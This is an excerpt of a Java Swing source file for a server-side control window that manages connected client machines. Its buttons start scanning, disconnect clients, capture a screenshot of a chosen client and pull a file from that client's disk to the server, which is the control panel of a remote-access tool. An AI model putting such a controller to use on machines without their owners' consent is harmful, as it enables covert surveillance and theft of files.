...
public class Server_Frame extends JFrame implements ActionListener {
	...
	void start_server_thread(int PORT) {
		server_thread = new Server_Thread(PORT);
		server_thread.start();
	}
	...
	void buttons() {
		...
		add(start_scanning);
		start_scanning.setBounds(150,200,130,30);
		...
		add(stop_scanning);
		stop_scanning.setBounds(10,200,130,30);
		...
		add(disconnect_all);
		disconnect_all.setBounds(150,240,130,30);
	...
	void comboboxes() {
		add(connected_ips);
		connected_ips.setBounds(10,240,130,30);
	...
	public void actionPerformed(ActionEvent e) {
		...
		if(e.getSource() == screenshot_button) {
			if(connected_ips.getItemCount() != 0) {
				System.out.println("operation request to: " + connected_ips.getSelectedItem());
				server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_screenshot("downloaded_ss");
			}
		}
		...
		if(e.getSource() == receive_file) {
			if(connected_ips.getItemCount() != 0) {
				System.out.println("operation request to: " + connected_ips.getSelectedItem());
				server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_send_clients_file_to_server(path_field.getText().toString(), "downloaded_files");
			}
		}
